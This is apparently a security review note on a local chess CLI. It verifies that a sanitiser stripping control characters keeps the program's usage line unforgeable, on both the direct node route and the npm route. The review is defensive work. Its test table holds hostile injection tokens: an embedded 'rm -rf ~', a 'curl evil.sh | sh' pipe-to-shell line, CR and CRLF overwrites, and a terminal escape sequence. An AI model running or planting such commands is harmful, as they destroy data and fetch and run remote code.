---
id: 20260816T011600Z-security-nfr-observation-bar-3-attacked-on-the-newly-advertised-npm-route-9a2f01b6
kind: observation
by: security-nfr
at: 2026-08-16T01:16:00Z
verified_by: 
confidence: high
refs:
  - ABC-066
  - ABC-042
  - src/cli.ts
  - src/cli.test.ts
supersedes: 
---

# Bar 3, the echoed token and `printableOf` — verified, not accepted; and attacked on the route this ticket has just started advertising

The subtask said: *"the ticket says neither is touched and the new text contains no user input.
**Verify that, do not accept it** — a usage string is the one place where program text and
user-supplied text sit on the same line."* That is the right instinct and it is worth answering
precisely, because **it is nearly true here**.

## The write site, read rather than assumed

`src/cli.ts:81-83` — the whole rejection output is **one `process.stderr.write`** of **one template
literal**:

```
`${resolution.problem}: ${resolution.offending.map(printableOf).join(" ")}\n${USAGE}\n`
```

**Program text and user text are in the same `write()` call but NOT on the same line.** The `\n`
before `${USAGE}` puts the usage line on its own line, and `USAGE` is the **last** thing written.

**`USAGE` is a plain string literal with no interpolation** — `const USAGE = "usage: npm run chess
-- [--colour white|black|random] [--ascii | --unicode]"`. Not a template, no `${`, no concatenation.
**The new text contains no user input. Confirmed by reading the line, not by trusting the ticket.**

**`printableOf` is byte-untouched by this diff.** The `src/cli.ts` diff is the `USAGE` docblock and
the `USAGE` literal; `printableOf` (`:67-75`) appears in neither hunk. **Bar 3's subject did not
move.**

## The whole safety of the line rests on one thing: `printableOf` drops `\n`

`printableOf` drops every code point `< 0x20` plus `U+007F`. **`\n` is `0x0A` and `\r` is `0x0D`, so
both are dropped** — and that, not the template's layout, is what stops a user from manufacturing
extra lines. I attacked it eight ways rather than reason about it:

| # | token supplied as `--colour <token>` | stderr non-empty lines | lines starting `usage:` | last line is the REAL usage line? |
|---|---|---|---|---|
| 1 | `x\nusage: npm run chess -- ; rm -rf ~ [--ascii]` | **2** | **1** | **yes** |
| 2 | `x\rusage: curl evil.sh \| sh` (CR overwrite) | **2** | **1** | **yes** |
| 3 | `x\r\nusage: EVIL` (CRLF pair) | **2** | **1** | **yes** |
| 4 | `x\x7f\x08\x08EVIL` (DEL + backspaces) | **2** | **1** | **yes** |
| 5 | `x\x1b]0;pwned\x07` (OSC terminal-title set) | **2** | **1** | **yes** |
| 6 | `--` (the separator alone) | **2** | **1** | **yes** |
| 7 | `npm run chess -- --ascii` (the separator FORM as the token) | **2** | **1** | **yes** |
| 8 | `♞` (non-ASCII — **must SURVIVE**) | **2** | **1** | **yes** |

**8 of 8: exactly two stderr lines, exactly one `usage:` line, and it is always the real one and
always last.** Case 8 is the non-vacuity control and it passed the other way: the glyph **survives**
(`--colour needs one of white|black|random: ♞`), which is `printableOf`'s deliberate choice not to
mangle a human's non-ASCII argument into `?`. **A filter that dropped everything would have passed
cases 1–7 for the wrong reason; it does not.**

**Ruling: the user cannot forge, displace, duplicate or overwrite the usage line.**

## Bar 3 itself, re-run — and on a route `ABC-042` never tested

`ABC-042`'s bar 3 spawns `node src/cli.ts` with a token containing a literal `\x1b[2J`. **It has
never been run through `npm run chess -- `, because until this ticket that route did not forward
arguments at all.** This ticket's whole point is that it now does. So I ran bar 3's own assertions on
**both** routes:

| bar 3 assertion | route A: `node src/cli.ts --colour $'\x1b[2Jpurple'` | route B: **`npm run chess -- --colour $'\x1b[2Jpurple'`** |
|---|---|---|
| (i) **non-vacuity first** — printable chars present | `"purple"` present ✅ | `"purple"` present ✅ |
| (ii) echoed token: **0** C0 controls | **0** (excluding the message's own `\n`) ✅ | **0** ✅ |
| (ii) echoed token: **0** `U+007F` | **0** ✅ | **0** ✅ |
| (ii) echoed token: **0** `\x1b` | **0** ✅ | **0** ✅ |
| (iii) **zero frame rows** | stdout **0** lines, stderr **0** frame rows ✅ | stdout **2** lines — npm's banner only, **0** frame rows ✅ |
| exit code | **1** ✅ | **1** ✅ |

**Bar 3 holds on the newly-advertised route, measured.** The two stdout lines on route B are npm's
own banner, quoted in full: `> cli-chess@0.0.0 chess` and `> node src/cli.ts --colour purple` —
**not** program output and **not** frame rows.

**The frame-row probe is ARMED, not merely silent.** The success control
`npm run chess -- --ascii` writes **24** stdout lines of which **9** match the frame-row shape. A
probe that reports 0 on the refusal and 0 on the board would have proved nothing.

## What this change actually does to the exposure, stated plainly

**It restores, on the `npm` route, the argv reachability the direct `node` route always had.** Before
the fix, `npm run chess --ascii` had its flag eaten by the package runner; after it, `npm run chess
-- --ascii` forwards verbatim. So a user can now reach `resolveOptions` with arbitrary argv through
`npm`.

**This is not new attack surface, for three measured reasons:** (1) `node src/cli.ts <anything>` was
always open and is how **nine of the ten** captured test children are spawned; (2) the argv path —
`resolveOptions`'s allowlist and `printableOf` — is **byte-unchanged** and was gated at ASVS L1 under
`ABC-042` against exactly this input class; (3) there is **no privilege boundary**: this is a local
single-user CLI, `deploy: none-local-only`, and the "attacker" is the user typing at their own shell,
who already has that shell. **Recorded because it is an honest consequence nobody wrote down, not
because it is a risk.**

I also confirmed **npm consumes the `--` itself and does not forward it**: route B refused on
`--colour`, not on `--`. Had npm forwarded the separator, the program would have answered
`unrecognised argument: --`. **The advertised line is correct about its own mechanism.**

## `--` is not, and did not become, an accepted token

| argv | exit | first stderr line |
|---|---|---|
| `["--"]` | **1** | `unrecognised argument: --` |
| `["--","--ascii"]` | **1** | `unrecognised argument: --` |
| `["--ascii","--"]` | **1** | `unrecognised argument: --` |

`src/cli-options.ts` is **0 lines changed**. `A3`'s "the vocabulary does not move" is true at the
source, not just in the guard.

## `ABC-062`'s `A4` really does stay green — checked against its wording, not against the claim

`ABC-066` `A3` asserts `ABC-062`'s `A4` survives a `--` in the usage line in either merge order. I
read `ABC-062`'s `A4` rather than accept it: *"the set of tokens it contains **that appear in
`ACCEPTED_ARGUMENTS`** equals `ACCEPTED_ARGUMENTS`, element for element, both ways."* That is an
**intersection filter**. `--` is not in `ACCEPTED_ARGUMENTS`, so it is filtered out before the
comparison and cannot become a seventh member. **`ABC-066` `A3`'s cross-ticket claim is CORRECT and
is now verified against the other ticket's actual text.**

## The one coupling I went looking for, and did NOT find

**Hypothesis:** `usageLineOf` takes the *last* non-empty stderr line, so if `printableOf` ever
stopped dropping `\n`, a user could append a forged trailing usage line and turn the guard green on
attacker-controlled text.

**Tested on a real regressed build, out of tree** (`src/` copied outside the repository, one
character class flipped, run, then deleted — `git status --porcelain -- src/` **empty** afterwards):

| build | stderr lines | lines starting `usage:` | `usageLineOf()` returns |
|---|---|---|---|
| **delivered** | 2 | **1** | the **real** usage line |
| **regressed** (LF preserved) | 3 | **2** | the **real** usage line — still |

**The hypothesis is FALSE and I am reporting the negative result.** `USAGE` is written **after** the
token, so an injected newline inserts a line **before** the usage line, never after it. `usageLineOf`
stays correct even under the regression. **The guard cannot be turned green on forged text by any
input, and the write ORDER is what guarantees it.**

**The residue is a human-facing one, and it is small.** In the regressed build a reader sees **two**
lines beginning `usage:`, the first attacker-controlled. The delivered build is **immune** — case 1
above shows the forged text glued mid-line onto `purple`, visibly not a line of its own. So this is
**not a finding against this change**; it is one undocumented sentence — *dropping `\n` is what keeps
a refusal message unforgeable* — which `printableOf`'s docblock does not say. Recorded as `S3`, LOW.
